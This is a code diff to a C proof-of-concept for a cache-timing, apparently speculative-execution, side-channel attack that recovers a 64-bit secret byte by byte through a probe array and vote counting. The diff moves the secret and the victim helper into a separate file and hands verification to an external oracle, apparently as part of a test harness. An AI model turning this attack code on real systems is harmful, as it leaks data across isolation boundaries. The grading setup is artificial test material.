@@ -93,16 +93,11 @@
 #define SENT0      0xA5A5A5A5A5A5A5A5ULL
 #define SENT1      0x5A5A5A5A5A5A5A5AULL
 
-#ifndef SECRET_VAL
-#define SECRET_VAL 0x1122334455667788ULL
-#endif
-
 static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
 static volatile uint64_t pair_arr[TRAIN];
 static volatile uint64_t atk_buf[64];
 
 static volatile uint8_t flushbuf[FLUSH_SZ];
-static volatile uint64_t secret_box = SECRET_VAL;
 
 static inline uint64_t
 rdcycle(void)
@@ -159,20 +154,12 @@ atk_load(volatile uint64_t *base, uint64_t idx)
     return base[idx & 63];
 }
 
-/* Hardened helper: branchless, no data-dependent memory access, and it
- * overwrites its value register before returning.  It performs the load itself
- * so that the caller introduces no load between it and L_atk. */
-__attribute__((noinline, noclone, noipa))
-static uint64_t
-victim(uint64_t token)
-{
-    uint64_t s = secret_box;
-    uint64_t ok = (s == token);
-    asm volatile("" : "+r"(s));
-    s = 0;
-    asm volatile("" : "+r"(s));
-    return ok;
-}
+/* The target value and the helpers live in a separate translation unit
+ * (egdiff_secret.c) so this file has no architectural reference to the value
+ * it is supposed to obtain. */
+extern uint64_t victim_value(uint64_t token);
+extern int oracle_report_v1(uint64_t recovered, uint64_t known_mask,
+                            uint64_t sink);
 
 static uint64_t
 mix(uint64_t x)
@@ -225,7 +212,7 @@ main(void)
             flush_drain();
 
             /* ---- 3. Helper executes exactly once ---- */
-            uint64_t ok = victim(0);
+            uint64_t ok = victim_value(0);
 
             /* ---- 4. Delay L_atk's address using register-only divisions ----
              * No constants, so nothing spills/reloads between the helper's
@@ -313,7 +300,6 @@ main(void)
 
         int ok_byte = (win >= 0 && votes[win] >= MIN_VOTES &&
                        votes[win] >= 2 * runner);
-        uint8_t want = (uint8_t)((secret_box >> (8 * b)) & 0xff);
 
         if (ok_byte) {
             recovered |= ((uint64_t)(uint8_t)win) << (8 * b);
@@ -321,17 +307,11 @@ main(void)
         }
 
         printf("byte %d: %s=0x%02x votes=%d runnerup=%d "
-               "voted=%d sentinel_only=%d ambiguous=%d invalid=%d -> %s\n",
+               "voted=%d sentinel_only=%d ambiguous=%d invalid=%d\n",
                b, ok_byte ? "got" : "UNKNOWN",
                ok_byte ? win : 0, ok_byte ? votes[win] : 0, runner,
-               n_vote, n_archonly, n_ambig, n_invalid,
-               (ok_byte && (uint8_t)win == want) ? "ok" : "WRONG");
+               n_vote, n_archonly, n_ambig, n_invalid);
     }
 
-    int match = (known == 0xff) && (recovered == secret_box);
-    printf("poc_v1 secret=%016llx recovered=%016llx known=%02x sink=%llu %s\n",
-           (unsigned long long)secret_box, (unsigned long long)recovered,
-           (unsigned)(known & 0xff), (unsigned long long)sink,
-           match ? "MATCH" : "NO-MATCH");
-    return match ? 0 : 1;
+    return oracle_report_v1(recovered, known, sink);
 }
